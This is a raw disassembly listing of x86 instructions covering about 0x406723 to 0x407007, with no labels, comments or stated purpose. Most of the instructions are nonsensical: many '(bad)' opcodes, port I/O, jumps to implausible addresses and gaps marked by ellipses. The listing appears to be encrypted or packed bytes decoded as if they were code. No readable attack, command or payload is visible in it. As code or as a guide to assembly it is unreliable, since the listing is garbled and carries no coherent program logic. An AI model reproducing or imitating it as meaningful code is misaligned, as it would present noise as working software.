  406723:	mov    bh,bh
  406725:	push   DWORD PTR [edx]
  406727:	inc    ecx
  406728:	mov    al,ds:0xbfffca00
  40672d:	cmova  esi,DWORD PTR [edx-0x2]
  406731:	(bad)  
  406732:	jge    0x4066bd
  406734:	mov    ch,0xbc
  406736:	pop    esp
  406737:	mov    edi,edi
  406739:	call   0xa3b9a1
  40673e:	arpl   WORD PTR [edi],cx
  406740:	dec    esi
  406741:	mov    eax,0xe88407a5
  406746:	ret    0x842e
  406749:	jmp    FWORD PTR [edx+0x37fff72a]
  40674f:	jecxz  0x4066e7
  406751:	sbb    DWORD PTR [edi+0x7f454b68],0x6c
  406758:	add    eax,DWORD PTR [eax]
  40675a:	arpl   WORD PTR [edi-0x7],dx
  40675d:	or     edi,DWORD PTR [ebx-0x49]
  406760:	push   esi
  406761:	inc    DWORD PTR [eax]
	...
  40676f:	add    BYTE PTR [eax],al
  406771:	fs jae 0x4067b7
  406774:	je     0x4067ef
  406776:	cmc    
  406777:	enter  0x54fb,0x41
  40677b:	adc    al,0xff
  40677d:	(bad)  
  40677e:	mov    al,0x6c
  406780:	adc    eax,0x5083a731
  406785:	cmp    al,0x19
  406787:	sub    al,0xc6
  40678a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40678b:	cmp    edi,0xffffffdc
  40678e:	sub    BYTE PTR [eax-0x6789d96],al
  406794:	sti    
  406795:	sbb    al,0x79
  406797:	or     ebp,eax
  406799:	dec    edi
  40679a:	test   BYTE PTR [edx+0x7f790cff],0xe8
  4067a1:	scas   al,BYTE PTR es:[edi]
  4067a2:	ss cmp edi,0x2a
  4067a6:	sub    dl,BYTE PTR [eax]
  4067a8:	add    BYTE PTR [esi+0x27816fe3],cl
  4067ae:	fadd   QWORD PTR [ecx+0x351e4ff]
  4067b4:	push   0x60
  4067b6:	aas    
  4067b7:	stc    
  4067b8:	pop    es
  4067b9:	retf   
  4067ba:	mov    edi,0xe4ccff4e
  4067bf:	enter  0x3bfb,0x5
  4067c3:	in     eax,dx
  4067c4:	add    al,0x63
  4067c6:	add    eax,0x7eac896c
  4067cb:	push   ss
  4067cc:	adc    DWORD PTR [ebx],0x6d
  4067cf:	xor    eax,0xf20563a3
  4067d4:	inc    ebx
	...
  4067e1:	add    BYTE PTR [eax],al
  4067e3:	add    BYTE PTR [ecx+ecx*4+0x4a],ch
  4067e7:	add    al,0x63
  4067e9:	add    eax,0x56207b4
  4067ee:	jmp    0xe9dd4405
  4067f3:	add    esp,DWORD PTR [ebx-0x13]
  4067f6:	cwde   
  4067f7:	xor    esp,DWORD PTR [edx]
  4067f9:	add    eax,0x7e748864
  4067fe:	into   
  4067ff:	adc    BYTE PTR [ebx],0x6d
  406802:	mov    dl,BYTE PTR [esp+ebx*2+0x7d]
  406806:	jo     0x406790
  406808:	push   ebx
  406809:	jl     0x4067c1
  40680b:	or     BYTE PTR [ebx+esi*4-0x47],0x81
  406810:	inc    esp
  406811:	jge    0x406824
  406813:	or     BYTE PTR [edx+0x5],ah
  406816:	jmp    0x97b546ab
  40681b:	sub    BYTE PTR [esi+edx*8],0x0
  40681f:	dec    esp
  406820:	jnp    0x4067e8
  406822:	call   0x28769012
  406827:	add    al,0x8b
  406829:	mov    ebx,0x650cc4b9
  40682e:	arpl   WORD PTR [edx+0x43f20563],sp
  406834:	ja     0x40684c
  406836:	rol    DWORD PTR [ebx],cl
  406838:	out    0x82,al
  40683a:	pop    esi
  40683b:	sub    esp,0x6e82b97c
  406841:	or     eax,0x7cde9d51
  406846:	add    BYTE PTR ds:[eax],0x0
	...
  406856:	add    BYTE PTR [esi],cl
  406858:	jbe    0x40685a
  40685a:	aaa    
  40685b:	loope  0x4068d9
  40685d:	push   0x55fe5
  406862:	je     0x40684f
  406864:	je     0x406864
  406866:	push   ds
  406867:	loope  0x40683e
  406869:	and    DWORD PTR [bx+si-0x3a],edi
  40686d:	inc    DWORD PTR [eax-0x16becae9]
  406873:	mov    BYTE PTR [edx+0x6d60a830],bh
  406879:	dec    edi
  40687a:	push   esi
  40687b:	pusha  
  40687c:	add    eax,0x158c290b
  406881:	push   0xffffffe9
  406883:	in     eax,dx
  406884:	xor    bh,0xdf
  406887:	loop   0x406905
  406889:	push   eax
  40688a:	(bad)  
  40688b:	je     0x406891
  40688d:	call   0xffbc4cc0
  406892:	(bad)  
  406893:	adc    al,0x75
  406895:	(bad)  
  406896:	mov    esi,0xa47d6ce2
  40689b:	loop   0x406918
  40689d:	push   0x2
  40689f:	mov    bh,0x42
  4068a1:	shl    DWORD PTR [esi+0x15c00fe2],1
  4068a7:	sub    ebp,0xffffff9e
  4068aa:	fldenv [ecx]
  4068ac:	jl     0x4068fd
  4068ae:	add    DWORD PTR ds:0x3786ff55,0xe218ffee
  4068b8:	icebp  
  4068b9:	pop    es
  4068ba:	add    DWORD PTR [eax],0x0
	...
  4068c8:	add    BYTE PTR [eax],al
  4068ca:	push   ebp
  4068cb:	jp     0x4068cc
  4068cd:	outs   dx,BYTE PTR ds:[esi]
  4068ce:	ja     0x4068a3
  4068d0:	int3   
  4068d1:	data16 loop 0x4068c0
  4068d4:	lea    ebx,[ecx]
  4068d6:	and    BYTE PTR [ecx+ebp*2-0xd],bh
  4068da:	jecxz  0x4068cd
  4068dc:	pop    es
  4068dd:	inc    ecx
  4068de:	mov    ch,0x7a
  4068e0:	inc    DWORD PTR [eax]
  4068e2:	and    eax,0xb308d69
  4068e7:	or     BYTE PTR [edx+0x23],ch
  4068ea:	xchg   ebp,eax
  4068eb:	je     0x4068f4
  4068ed:	call   0x3ff023
  4068f2:	rcl    BYTE PTR [ebp+0x69ca4130],cl
  4068f8:	sbb    edi,edi
  4068fa:	iret   
  4068fb:	psubsb mm1,QWORD PTR [esp+edx*2+0x1fffff86]
  406903:	cld    
  406904:	(bad)  
  406905:	jne    0x406899
  406907:	out    dx,eax
  406908:	fwait
  406909:	retf   0x8495
  40690c:	leave  
  40690d:	ret    0x77e
  406910:	push   ebp
  406911:	mov    edx,DWORD PTR [esi-0x5a000091]
  406917:	inc    ebp
  406918:	push   DWORD PTR [ebp-0x7a]
  40691b:	test   BYTE PTR [ebp+0x8],dh
  40691e:	mov    ds:0x25ffedf6,al
  406923:	rol    cl,1
  406925:	or     BYTE PTR [edx+0x54],cl
  406928:	mov    ch,ah
  40692a:	mov    ecx,0xc7f7c2
	...
  40693b:	add    BYTE PTR [eax],al
  40693d:	jg     0x4068c4
  40693f:	add    BYTE PTR [eax],al
  406941:	dec    edx
  406942:	pop    es
  406943:	lea    eax,[ebp-0x2a]
  406946:	push   esi
  406947:	fmul   DWORD PTR [bp+si]
  40694a:	dec    eax
  40694b:	(bad)  
  40694c:	dec    BYTE PTR [edi+0x15]
  40694f:	push   DWORD PTR ds:0x412e7f
  406955:	repnz std 
  406957:	into   
  406958:	call   DWORD PTR [ebp+0x1474c009]
  40695e:	nop
  40695f:	inc    ebp
  406960:	clc    
  406961:	adc    cl,BYTE PTR [eax]
  406963:	add    bh,ch
  406965:	aam    0x85
  406967:	jne    0x406965
  406969:	arpl   bx,dx
  40696b:	cmc    
  40696c:	mul    esp
  40696e:	push   ecx
  40696f:	or     ebp,eax
  406971:	cmp    edx,edx
  406973:	jg     0x406974
  406975:	aam    0xb1
  406977:	jnp    0x406961
  406979:	push   cs
  40697a:	and    DWORD PTR [eax+0xb2e9aff],eax
  406980:	add    BYTE PTR [esi],dl
  406982:	imul   DWORD PTR [esi-0x7f]
  406985:	lahf   
  406986:	rol    BYTE PTR [eax-0x79d45301],1
  40698c:	mov    eax,0x800ba5
  406991:	arpl   WORD PTR [ebx+eax*1-0x75],bp
  406995:	push   ds
  406996:	push   0x6917c00c
  40699b:	cmp    DWORD PTR [eax],0x63
  40699e:	icebp  
  40699f:	add    eax,0xe9
	...
  4069b0:	ins    DWORD PTR es:[di],dx
  4069b2:	add    eax,DWORD PTR [eax]
  4069b4:	je     0x406987
  4069b6:	adc    edi,edi
  4069b8:	neg    BYTE PTR [edi+0x6b]
  4069bb:	sub    DWORD PTR [ebx-0x4caf80b5],edx
  4069c1:	inc    ebx
  4069c2:	stc    
  4069c3:	pop    es
  4069c4:	dec    ebx
  4069c5:	ret    0xff7e
  4069c8:	dec    esp
  4069c9:	inc    esp
  4069ca:	sti    
  4069cb:	retf   
  4069cc:	inc    esp
  4069cd:	stos   DWORD PTR es:[edi],eax
  4069ce:	in     al,dx
  4069cf:	mov    dh,0x8f
  4069d1:	sub    eax,0x68aeff04
  4069d6:	imul   ecx,DWORD PTR ds:0x897f9313,0xffffffde
  4069dd:	sar    DWORD PTR [ebp-0x1],cl
  4069e0:	sbb    al,0x14
  4069e2:	add    DWORD PTR ds:[ebx+0x6c],esp
  4069e6:	nop
  4069e7:	test   DWORD PTR [ecx],esp
  4069e9:	bnd jle 0x4069eb
  4069ec:	mov    bl,0x84
  4069ee:	mov    esp,ecx
  4069f0:	cld    
  4069f1:	add    al,0x66
  4069f3:	xchg   ecx,eax
  4069f4:	fiadd  WORD PTR [esi+0x5f]
  4069f7:	jg     0x4069e5
  4069f9:	aam    0x55
  4069fb:	mov    ecx,0x7f4e7aab
  406a00:	retf   
  406a01:	inc    ebx
  406a02:	fs add al,0x63
  406a05:	mov    WORD PTR [eax+eax*8-0x33],fs
  406a09:	jns    0x406a41
  406a0b:	les    edx,FWORD PTR [ebp-0x7f]
  406a0e:	xchg   BYTE PTR [ebx+eiz*2],al
  406a11:	add    eax,0x9974
	...
  406a22:	add    BYTE PTR [ecx-0x4b80e186],ah
  406a28:	push   es
  406a29:	stc    
  406a2a:	add    esp,DWORD PTR [ebx+0x5]
  406a2d:	xchg   ebp,eax
  406a2e:	imul   edi
  406a30:	(bad)  
  406a31:	sub    edi,DWORD PTR [esi-0x6c]
  406a34:	jns    0x406aa2
  406a36:	ret    0xd538
  406a39:	xor    BYTE PTR [ecx+0x6be8c437],0xdb
  406a40:	xchg   edi,eax
  406a41:	jmp    0x5485d249
  406a46:	add    bh,BYTE PTR [eax-0x22]
  406a49:	arpl   WORD PTR [eax+0x7ece7aa1],bx
  406a4f:	out    dx,al
  406a50:	ret    
  406a51:	adc    al,0xd4
  406a53:	mov    esp,0x4cc50db1
  406a58:	popa   
  406a59:	aaa    
  406a5a:	mov    eax,ds:0x43e20563
  406a5f:	mov    dh,0x3
  406a61:	xchg   edx,eax
  406a62:	ret    
  406a63:	out    0x92,eax
  406a65:	stos   DWORD PTR es:[edi],eax
  406a66:	jge    0x406a94
  406a68:	jns    0x406ace
  406a6a:	sar    DWORD PTR [eax-0x72],0x64
  406a6e:	mov    bh,0x1d
  406a70:	jns    0x4069f8
  406a72:	jmp    0x406a92
  406a74:	sub    BYTE PTR cs:[esp+ecx*1],al
  406a78:	repz jmp esp
  406a7b:	js     0x406a7b
  406a7d:	into   
  406a7e:	outs   dx,BYTE PTR ds:[esi]
  406a7f:	jge    0x406af9
  406a81:	mov    ch,0x9d
  406a83:	jbe    0x406afd
  406a85:	(bad)  
  406a86:	mov    ecx,0x0
	...
  406a93:	add    BYTE PTR [eax],al
  406a95:	add    BYTE PTR [eax+0x46],bh
  406a98:	iret   
  406a99:	push   esi
  406a9a:	gs js  0x406b12
  406a9d:	stc    
  406a9e:	mov    al,0x60
  406aa0:	mov    eax,0x50785536
  406aa5:	cdq    
  406aa6:	dec    ebp
  406aa7:	repnz pop es
  406aa9:	inc    ecx
  406aaa:	push   DWORD PTR [edi-0x1]
  406aad:	cs dec eax
  406aaf:	scas   eax,DWORD PTR es:[edi]
  406ab0:	retf   
  406ab1:	es xor eax,0x2e2b858a
  406ab7:	js     0x406ab8
  406ab9:	mov    ecx,0xfbcb225
  406abe:	sbb    eax,0xc3d5e878
  406ac3:	add    eax,0x8206400
  406ac8:	test   DWORD PTR [ebp-0x110087fb],ecx
  406ace:	mov    ah,0xb9
  406ad0:	(bad)  
  406ad1:	out    0xf6,al
  406ad3:	ins    BYTE PTR es:[edi],dx
  406ad4:	pop    ds
  406ad5:	jl     0x406b3e
  406ad7:	add    eax,0x77a79cff
  406adc:	dec    esi
  406ade:	iret   
  406adf:	jg     0x406aac
  406ae1:	(bad)  
  406ae2:	(bad)  
  406ae3:	dec    esi
  406ae4:	ret    0x60ed
  406ae7:	ror    BYTE PTR [edx-0x3bf1d3b],cl
  406aed:	scas   al,BYTE PTR es:[edi]
  406aee:	xor    al,0xc
  406af0:	call   0xffb9119f
  406af5:	jo     0x406b1b
  406af7:	jl     0x406b04
  406af9:	test   eax,0x0
	...
  406b06:	add    BYTE PTR [eax],al
  406b08:	add    BYTE PTR [esi-0x7f],dl
  406b0b:	mov    ecx,gs
  406b0d:	pusha  
  406b0e:	add    eax,0x360c0068
  406b13:	inc    ecx
  406b14:	add    BYTE PTR [ebp-0x6e170490],cl
  406b1a:	(bad)  
  406b1b:	(bad)  
  406b1c:	call   FWORD PTR [edx+0x69]
  406b1f:	pop    esi
  406b20:	xor    cl,bl
  406b22:	add    edx,DWORD PTR [eax-0x1]
  406b25:	pop    ss
  406b26:	or     al,0xe8
  406b28:	xchg   esp,eax
  406b29:	mov    edx,?
  406b2b:	(bad)  
  406b2c:	call   0x3f3833
  406b31:	mov    dl,0x24
  406b33:	xor    al,BYTE PTR [ecx-0x46]
  406b36:	clc    
  406b37:	je     0x406b35
  406b39:	and    bl,bl
  406b3b:	int    0xff
  406b3d:	lea    edx,[ecx+0x67]
  406b40:	pop    edi
  406b41:	cwde   
  406b42:	inc    edx
  406b43:	dec    DWORD PTR [edi+0x4d]
  406b46:	jo     0x406b4f
  406b48:	call   0x3f6516
  406b4d:	bound  esp,QWORD PTR [edx]
  406b4f:	retf   
  406b50:	call   FWORD PTR [ebp+0x69]
  406b53:	cmp    esi,DWORD PTR [edx]
  406b55:	mov    ebx,0x8e75ff03
  406b5a:	jmp    0x406b14
  406b5c:	into   
  406b5d:	(bad)  
  406b5e:	clc    
  406b5f:	dec    edi
  406b60:	push   0x41331d
  406b65:	sub    bh,dl
  406b67:	je     0x406b71
  406b69:	mov    ds:0xfffd55,al
	...
  406b7a:	add    BYTE PTR [eax],al
  406b7c:	sub    eax,0x1dcb05eb
  406b81:	cli    
  406b82:	addr16 push esi
  406b84:	dec    eax
  406b85:	inc    esp
  406b86:	(bad)  
  406b87:	inc    BYTE PTR [edi-0x2367177b]
  406b8d:	stc    
  406b8e:	(bad)  
  406b8f:	push   eax
  406b90:	push   edx
  406b91:	pop    eax
  406b92:	xor    DWORD PTR [ecx+0x3a],eax
  406b95:	push   ebx
  406b96:	(bad)  
  406b97:	jne    0x406bfc
  406b99:	imul   esi,DWORD PTR fs:[ecx],0x1d
  406b9d:	mov    BYTE PTR [eax+ebp*8-0x2],bh
  406ba1:	mov    dl,0x7c
  406ba3:	dec    DWORD PTR [edx+esi*2]
  406ba6:	jg     0x406b90
  406ba8:	mov    es:0xab2aff7c,eax
  406bae:	or     eax,DWORD PTR [eax]
  406bb0:	mov    ?,ebx
  406bb2:	outs   dx,BYTE PTR ds:[esi]
  406bb3:	and    DWORD PTR [edi],0xffffffd9
  406bb6:	shr    DWORD PTR [ecx+0x63],cl
  406bb9:	inc    edx
  406bba:	pop    es
  406bbb:	call   DWORD PTR [esi+0x64]
  406bbe:	imul   edi,esi,0xffffff9c
  406bc1:	mov    edi,0x3826897b
  406bc6:	mov    BYTE PTR ds:0xffc30435,bh
  406bcc:	cmp    al,0x67
  406bce:	add    esi,DWORD PTR [eax+edi*2-0x6c]
  406bd2:	push   ebx
  406bd3:	xor    BYTE PTR [edx],ah
  406bd5:	ins    BYTE PTR es:[edi],dx
  406bd6:	aam    0xe7
  406bd8:	sbb    dh,cl
  406bda:	add    al,BYTE PTR [eax]
  406bdc:	push   0x1df72c
	...
  406bed:	add    BYTE PTR [eax],al
  406bef:	sub    al,0x14
  406bf1:	out    dx,eax
  406bf2:	ror    DWORD PTR [edi+esi*2+0x580fc007],cl
  406bf9:	shl    DWORD PTR [edi+0x1c],cl
  406bfc:	mov    edx,0x5f24ffc2
  406c01:	icebp  
  406c02:	pop    es
  406c03:	jnp    0x406bb4
  406c05:	jns    0x406c06
  406c07:	fs inc esp
  406c09:	(bad)
  406c0d:	js     0x406c42
  406c0f:	and    eax,DWORD PTR [ebp-0x48b30085]
  406c15:	jbe    0x406bc5
  406c17:	mov    esp,DWORD PTR [edi-0x10]
  406c1a:	(bad)  
  406c1b:	leave  
  406c1c:	push   edx
  406c1d:	jp     0x406c94
  406c1f:	imul   eax,DWORD PTR ds:0x762d7591,0xffffff9e
  406c26:	out    dx,al
  406c27:	xor    DWORD PTR [esi+0x1c],0x8f5e0b0c
  406c2e:	jnp    0x406c44
  406c30:	jmp    0x406c16
  406c32:	jp     0x406bca
  406c34:	or     eax,0x76055991
  406c39:	jbe    0x406c29
  406c3b:	inc    esi
  406c3c:	jbe    0x406c32
  406c3e:	or     ecx,DWORD PTR [ebx]
  406c40:	push   edx
  406c41:	addr16 jnp 0x406c30
  406c44:	in     al,dx
  406c45:	dec    edx
  406c46:	xor    al,0xa2
  406c48:	add    eax,0x6d64f156
  406c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c4e:	js     0x406c24
  406c50:	jne    0x406c23
  406c52:	adc    eax,DWORD PTR [eax]
	...
  406c60:	add    BYTE PTR [eax],al
  406c62:	xchg   edx,eax
  406c63:	(bad)  
  406c64:	call   0x414dbae3
  406c69:	cmp    al,0xbe
  406c6b:	jne    0x406c9b
  406c6d:	in     al,dx
  406c6e:	push   ds
  406c6f:	xor    al,0xa8
  406c71:	add    ebp,DWORD PTR [edi+ebp*8+0x78786bf0]
  406c78:	push   ss
  406c79:	jnp    0x406c86
  406c7b:	icebp  
  406c7c:	xlat   BYTE PTR ds:[ebx]
  406c7d:	les    edx,FWORD PTR [esi+esi*2+0x167b0b7c]
  406c84:	cld    
  406c85:	jp     0x406c0b
  406c87:	in     al,dx
  406c88:	inc    edx
  406c89:	xor    eax,0xf0ee0522
  406c8e:	pop    esp
  406c8f:	ins    DWORD PTR es:[edi],dx
  406c90:	clc    
  406c91:	js     0x406cff
  406c93:	jne    0x406ce6
  406c95:	pop    esp
  406c96:	xor    al,ah
  406c98:	call   0xc13e4317
  406c9d:	call   DWORD PTR [edi+0x75]
  406ca0:	(bad)  
  406ca1:	jp     0x406c79
  406ca3:	jno    0x406c63
  406ca5:	lock pop esp
  406ca7:	pop    ebp
  406ca8:	add    BYTE PTR [ebx],dh
  406caa:	mov    al,ds:0xa60eff74
  406caf:	inc    edi
  406cb0:	add    al,0xe9
  406cb2:	adc    eax,DWORD PTR [eax+0x12b6aec]
  406cb8:	add    BYTE PTR ds:0xf9757471,bl
  406cbe:	cdq    
  406cbf:	cli    
  406cc0:	or     eax,DWORD PTR [esi-0x4c17f2ed]
	...
  406cd2:	add    BYTE PTR [eax],al
  406cd4:	add    BYTE PTR [ebp+0x74],dh
  406cd7:	push   DWORD PTR [esi-0xd]
  406cda:	add    al,ch
  406cdc:	xchg   ecx,eax
  406cdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cde:	je     0x406cdf
  406ce0:	xor    BYTE PTR [esi-0x2a4bffff],ah
  406ce6:	popa   
  406ce7:	sub    DWORD PTR ds:0x4dffdf54,0xffffffd3
  406cee:	sbb    bh,bh
  406cf0:	mov    esp,0xed757470
  406cf5:	cmp    BYTE PTR [ebx-0x34],bl
  406cf8:	cmp    DWORD PTR ss:[eax],eax
  406cfb:	shl    BYTE PTR [ebp+0x25457d8c],0xb8
  406d02:	inc    esp
  406d03:	xor    ch,BYTE PTR [eax+0x15757460]
  406d09:	or     BYTE PTR [esi-0x22e6f134],bh
  406d0f:	(bad)  
  406d10:	call   0xfe91200e
  406d15:	je     0x406d23
  406d17:	call   0xffb46668
  406d1c:	adc    DWORD PTR ds:0xebe94137,0x39d1fbf9
  406d26:	inc    edx
  406d27:	call   esi
  406d29:	dec    edi
  406d2a:	add    eax,0xd519be00
  406d2f:	inc    BYTE PTR [eax]
  406d31:	pop    DWORD PTR [ecx]
  406d33:	call   0xff2e72c2
  406d38:	push   0x0
	...
  406d45:	add    BYTE PTR [eax],al
  406d47:	add    BYTE PTR [ebx+edi*1],ch
  406d4a:	inc    ecx
  406d4b:	add    BYTE PTR ds:0x29e8fb64,al
  406d51:	retf   
  406d52:	(bad)  
  406d53:	call   DWORD PTR [edx+0xb]
  406d56:	add    bh,ch
  406d58:	mov    ah,0x59
  406d5a:	(bad)  
  406d5b:	jne    0x406d5f
  406d5d:	loopne 0x406dcd
  406d5f:	jmp    ebp
  406d61:	in     eax,dx
  406d62:	(bad)  
  406d63:	jne    0x406ceb
  406d65:	loope  0x406dc4
  406d67:	leave  
  406d68:	jne    0x406d58
  406d6a:	enter  0x1ac2,0x8
  406d6e:	push   ebp
  406d6f:	mov    edx,DWORD PTR [esi-0x44cd0d9f]
  406d75:	pop    es
  406d76:	push   DWORD PTR [ebp-0x3a]
  406d79:	fucomip st,st(0)
  406d7b:	int3   
  406d7c:	and    eax,0xaa75feee
  406d81:	push   edi
  406d82:	out    0x34,eax
  406d84:	ja     0x406d74
  406d86:	(bad)  
  406d87:	(bad)  
  406d88:	inc    DWORD PTR [ebx]
  406d8a:	push   eax
  406d8b:	(bad)  
  406d8c:	out    dx,eax
  406d8d:	jmp    edi
  406d8f:	ds test esi,ebp
  406d92:	(bad)  
  406d93:	push   0x413b45
  406d98:	jne    0x406dfe
  406d9a:	or     ebp,eax
  406d9c:	cmp    eax,0x65fffebd
  406da1:	fs (bad) 
  406da4:	jb     0x406dc1
  406da6:	int    0xff
  406da8:	jne    0x406d96
  406daa:	je     0x406dc0
	...
  406db8:	add    BYTE PTR [eax],al
  406dba:	add    dl,bl
  406dbc:	in     al,dx
  406dbd:	je     0x406dc7
  406dbf:	xchg   edx,eax
  406dc0:	sbb    edi,edi
  406dc2:	inc    DWORD PTR [ebp+0x6310c1be]
  406dc8:	pop    esp
  406dc9:	into   
  406dca:	mov    al,BYTE PTR [edi-0x20]
  406dcd:	ds cld 
  406dcf:	dec    esp
  406dd0:	xor    cl,BYTE PTR [eax]
  406dd2:	call   0xffb90f8a
  406dd7:	push   0xea49ef9c
  406ddc:	sub    DWORD PTR [eax+0x68],edi
  406ddf:	arpl   WORD PTR [eax+ebp*2-0x42],bx
  406de3:	mov    ebx,0x634135ac
  406de8:	fwait
  406de9:	out    dx,al
  406dea:	sti    
  406deb:	adc    al,0x1a
  406ded:	or     al,0xe8
  406def:	fmul   DWORD PTR [ebx+0x5d7bff78]
  406df5:	add    ebp,edi
  406df7:	mov    ebp,0xa2325d04
  406dfc:	pop    esp
  406dfd:	js     0x406e74
  406dff:	out    dx,eax
  406e00:	jmp    0x406def
  406e02:	pop    es
  406e03:	sti    
  406e04:	pop    edx
  406e05:	js     0x406e06
  406e07:	fadd   QWORD PTR [ebp+eax*1+0x0]
  406e0b:	les    eax,FWORD PTR [edx-0x626e1a15]
  406e11:	add    edi,edi
  406e13:	dec    esi
  406e14:	xor    BYTE PTR [eax+0x75],bh
  406e17:	imul   eax,esp,0xffffffe1
  406e1a:	(bad)  
  406e1b:	mov    ah,0x23
  406e1d:	js     0x406e94
	...
  406e2b:	add    BYTE PTR [eax],al
  406e2d:	add    BYTE PTR [edi-0x5b374bec],ch
  406e33:	adc    ecx,DWORD PTR [edx-0x3e]
  406e36:	imul   ebx,DWORD PTR [esi+ecx*8-0x76],0xffffff87
  406e3b:	fistp  QWORD PTR [esi]
  406e3d:	cld    
  406e3e:	stc    
  406e3f:	pop    ebx
  406e40:	in     eax,dx
  406e41:	add    al,0x84
  406e43:	stc    
  406e44:	or     ch,al
  406e46:	xchg   esi,eax
  406e47:	and    DWORD PTR [eax-0x1],edi
  406e4a:	jmp    0x1b05:0xc26877a9
  406e51:	lds    esp,FWORD PTR [edx+ebp*8+0x45]
  406e55:	xor    ah,BYTE PTR [edx-0x51ce29fb]
  406e5b:	sbb    al,0x28
  406e5d:	add    al,0x4c
  406e5f:	clc    
  406e60:	lock imul esi,ebp,0x72
  406e64:	mov    esi,0xfbb6cb77
  406e69:	les    esi,FWORD PTR [edx+ebp*8]
  406e6c:	xor    DWORD PTR [edx],esi
  406e6e:	mov    ds:0x8e31a605,al
  406e73:	sbb    al,0x28
  406e75:	add    al,0x1c
  406e77:	clc    
  406e78:	loopne 0x406ee5
  406e7a:	in     eax,dx
  406e7b:	jb     0x406e0b
  406e7d:	ja     0x406efa
  406e7f:	lods   eax,DWORD PTR ds:[esi]
  406e80:	mov    ebx,0x5ea04c4
  406e85:	xor    ah,BYTE PTR [edx-0x71ce89fb]
  406e8b:	sbb    al,0x28
  406e8d:	add    al,0xec
  406e8f:	div    eax
  406e91:	imul   eax,DWORD PTR [eax],0x0
	...
  406ea0:	add    BYTE PTR [ebp+0x73],ah
  406ea3:	pop    esi
  406ea4:	ja     0x406ef1
  406ea6:	dec    eax
  406ea7:	sbb    eax,ebp
  406ea9:	aam    0xe9
  406eab:	lds    esi,FWORD PTR [ecx]
  406ead:	and    al,BYTE PTR ds:0x1c2e3146
  406eb3:	test   al,0x3
  406eb5:	mov    esp,0x3d6be0f7
  406eba:	jae    0x406eea
  406ebc:	ja     0x406ef9
  406ebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ebf:	fcmovnb st,st(4)
  406ec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ec2:	jmp    0x562a132
  406ec7:	push   ss
  406ec8:	xor    DWORD PTR [esi],ebp
  406eca:	sbb    al,0xa8
  406ecc:	add    ecx,DWORD PTR [edi+esi*8+0x73156bf0]
  406ed3:	(bad)  
  406ed4:	jbe    0x406ee1
  406ed6:	mov    dh,0x0
  406ed8:	mov    ebx,0x5c67719f
  406edd:	xor    esp,eax
  406edf:	jmp    ebp
  406ee1:	xor    ebx,eax
  406ee3:	sub    BYTE PTR [eax],ch
  406ee5:	addr16 jo 0x406f5d
  406ee8:	loope  0x406eb2
  406eea:	aaa    
  406eeb:	dec    dh
  406eed:	aad    0xdd
  406eef:	mov    bh,0xfb
  406ef1:	pop    ds
  406ef2:	jno    0x406f5b
  406ef4:	ins    BYTE PTR es:[edi],dx
  406ef5:	jb     0x406ebd
  406ef7:	push   DWORD PTR [ebp+0x2828da73]
  406efd:	addr16 jo 0x406f75
  406f00:	icebp  
  406f01:	mov    eax,0x9efe0f
	...
  406f12:	add    BYTE PTR [eax],al
  406f14:	xchg   ebp,eax
  406f15:	ffree  st(4)
  406f17:	fistp  DWORD PTR [edi]
  406f19:	jno    0x406f82
  406f1b:	pop    esp
  406f1c:	push   edx
  406f1d:	(bad)  
  406f1e:	inc    DWORD PTR [ebp+0x2828da53]
  406f24:	addr16 jo 0x406f9c
  406f27:	loope  0x406eb1
  406f29:	pop    es
  406f2a:	(bad)  
  406f2b:	outs   dx,BYTE PTR ds:[esi]
  406f2c:	jne    0x406f0b
  406f2e:	mov    al,ds:0x67711e1b
  406f33:	(bad)  
  406f34:	xchg   edx,eax
  406f35:	(bad)  
  406f36:	inc    eax
  406f38:	bound  eax,QWORD PTR ds:0xfa556900
  406f3e:	pop    es
  406f3f:	push   ecx
  406f40:	cmp    eax,0xc83eff72
  406f45:	mov    bl,0x32
  406f47:	test   al,0x60
  406f49:	fnstsw WORD PTR [edx-0x5]
  406f4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f4d:	jo     0x406fb6
  406f4f:	jmp    0x406fb1
  406f51:	add    eax,0x8931e80
  406f56:	call   0xffb08a8c
  406f5b:	or     eax,0x7a004133
  406f61:	pop    esp
  406f62:	data16 xor cl,bl
  406f65:	add    al,0x68
  406f67:	add    cl,BYTE PTR [edx-0x8007ffc]
  406f6d:	sti    
  406f6e:	out    0xc1,eax
  406f70:	jg     0x406f6c
  406f72:	(bad)  
  406f73:	push   0x413307
	...
  406f84:	add    BYTE PTR [eax],al
  406f86:	add    BYTE PTR [edx+0x3a413152],ah
  406f8c:	pop    esp
  406f8d:	add    DWORD PTR [eax],eax
  406f8f:	cmp    al,BYTE PTR [edi+edi*8-0x5623cd8b]
  406f96:	std    
  406f97:	in     eax,dx
  406f98:	stc    
  406f99:	addr16 mov eax,ds:0x4328
  406f9d:	jmp    DWORD PTR [edi-0x51]
  406fa0:	xor    eax,DWORD PTR [ecx+0x0]
  406fa3:	jb     0x406fa8
  406fa5:	add    BYTE PTR [eax],al
  406fa7:	mov    bh,dl
  406fa9:	je     0x406fb3
  406fab:	loop   0x406f42
  406fad:	std    
  406fae:	(bad)  
  406faf:	frstor [eax-0x4e]
  406fb2:	xor    cl,BYTE PTR [ebx+0x9]
  406fb5:	push   0xff42b88d
  406fba:	addr16 clc 
  406fbc:	add    eax,DWORD PTR [eax]
  406fbe:	cmp    BYTE PTR [ebp+0x60],0x7
  406fc2:	call   0x3f6685
  406fc7:	mov    ds:0xba4132ab,al
  406fcc:	pop    ebx
  406fcd:	mov    WORD PTR [edx],?
  406fcf:	sti    
  406fd0:	add    ebp,DWORD PTR [eax+0x2]
  406fd3:	retf   0x8003
  406fd6:	push   edi
  406fd8:	sti    
  406fd9:	out    0x65,eax
  406fdb:	jg     0x406fd7
  406fdd:	(bad)  
  406fde:	push   0x413377
  406fe3:	xacquire xchg BYTE PTR [edx],dh
  406fe6:	inc    ecx
  406fe7:	arpl   WORD PTR [esi-0x15],bx
  406fea:	add    DWORD PTR [eax],eax
	...
  406ff8:	add    BYTE PTR [eax],al
  406ffa:	arpl   WORD PTR [esi-0x7d],bx
  406ffd:	dec    DWORD PTR [esi]
  406fff:	jbe    0x40706c
  407001:	dec    esi
  407002:	jle    0x407072
  407004:	je     0x407070
  407006:	pop    ecx
  407007:	ja     0x406ff7
